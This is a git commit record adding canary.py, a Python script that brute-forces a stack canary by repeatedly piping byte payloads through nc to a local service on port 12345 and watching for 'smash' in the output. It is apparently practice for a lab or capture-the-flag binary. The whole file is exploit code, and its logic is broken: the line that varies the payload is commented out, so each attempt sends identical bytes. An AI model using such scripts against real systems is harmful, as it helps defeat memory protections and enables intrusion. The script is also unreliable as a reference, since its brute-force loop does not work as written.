28edaa3598340961d402bede7ee69e86749ef15b
ChoKyuWon <yyj10137@gmail.com>
2019-09-26 14:38:56 +0900

    init

---
+++ canary.py
@@ -0,0 +1,21 @@
+import subprocess
+from subprocess import Popen, PIPE, STDOUT
+import os
+import math
+from time import sleep
+
+canary = b'aaaaaaaaaa\x00+\xfd~\x0f\xf1%'
+tmp = 0
+while True:
+    #payload = b'a'*10 + canary + (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
+    payload = b'aaaaaaaaaa\x00+\xfd~\x0f\xf1%'
+    p = subprocess.Popen(['nc','127.0.0.1','12345'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
+    output = p.communicate(input=payload)[0]
+    if b'smash' not in output:
+        canary += (tmp).to_bytes(int(math.ceil((tmp).bit_length() / 8)), byteorder='big')
+        print('canary:', canary)
+        tmp = 0
+    print(payload)
+    print("output :", output)
+    tmp += 1
+    sleep(0.1)
